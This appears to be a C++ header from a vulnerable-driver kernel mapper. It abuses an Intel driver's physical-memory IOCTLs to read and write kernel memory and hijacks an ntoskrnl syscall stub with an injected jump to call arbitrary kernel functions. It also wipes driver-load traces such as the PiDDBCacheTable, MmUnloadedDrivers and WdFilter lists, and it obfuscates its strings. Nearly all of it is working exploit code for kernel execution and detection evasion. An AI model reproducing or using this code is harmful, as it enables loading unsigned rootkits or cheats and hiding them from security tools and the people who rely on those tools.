#pragma once
#include <Windows.h>
#include <string>

#include "utils.hpp"
#include "nt.hpp"

namespace intel_driver
{
	constexpr ULONG32 IOCTL_PHYS_READ_BULK   = 0x80112040;
	constexpr ULONG32 IOCTL_PHYS_READ_DWORD  = 0x80112074;
	constexpr ULONG32 IOCTL_PHYS_WRITE_DWORD = 0x80112078;

	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;
	extern ULONG64 ntoskrnlPhysBase;
	extern ULONG32 ntoskrnlImageSize;
	extern bool runtimeReady;
	extern ULONG32 loadedDriverTimestamp;
	extern std::wstring vulnerableDriverPath;

	bool PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size);
	bool PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size);
	bool ScanForNtoskrnlPhysBase();

	bool ClearPiDDBCacheTable();
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	NTSTATUS AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList();
	bool ClearWdFilterDriverList();

	bool IsRunning();
	NTSTATUS Load();
	NTSTATUS Unload();

	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);

	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(uint64_t address);
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers();
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
		if (ntdll == 0)
			return false;

		static uint64_t kernel_stub = 0;
		static std::string found_stub_name;

		if (!kernel_stub) {
			std::string candidates[] = {
				ENC("NtTraceControl"),
				ENC("NtQueryDebugFilterState"),
				ENC("NtSetDebugFilterState"),
				ENC("NtFlushBuffersFileEx"),
				ENC("NtAccessCheckByTypeAndAuditAlarm"),
				ENC("NtAddAtom"),
			};

			for (int i = 0; i < _countof(candidates); i++) {
				uint64_t addr = GetKernelModuleExport(intel_driver::ntoskrnlAddr, candidates[i]);
				if (addr) {
					uint8_t probe[16];
					if (ReadMemory(addr, probe, sizeof(probe))) {
						bool clean = true;
						if (probe[0] == 0x48 && probe[1] == 0xb8 && probe[10] == 0xff && probe[11] == 0xe0)
							clean = false;
						if (probe[0] == 0xe9 || probe[0] == 0xeb)
							clean = false;

						if (clean) {
							kernel_stub = addr;
							found_stub_name = candidates[i];
							break;
						}
					}
				}
			}

			if (!kernel_stub)
				return false;
		}

		const auto UserStub = reinterpret_cast<void*>(GetProcAddress(ntdll, found_stub_name.c_str()));
		if (!UserStub)
			return false;

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		if (!ReadMemory(kernel_stub, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == 0x48 && original_kernel_function[1] == 0xb8 &&
			original_kernel_function[10] == 0xff && original_kernel_function[11] == 0xe0)
			return false;

		if (!WriteToReadOnlyMemory(kernel_stub, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(UserStub);
			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(UserStub);
			Function(arguments...);
		}

		return WriteToReadOnlyMemory(kernel_stub, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
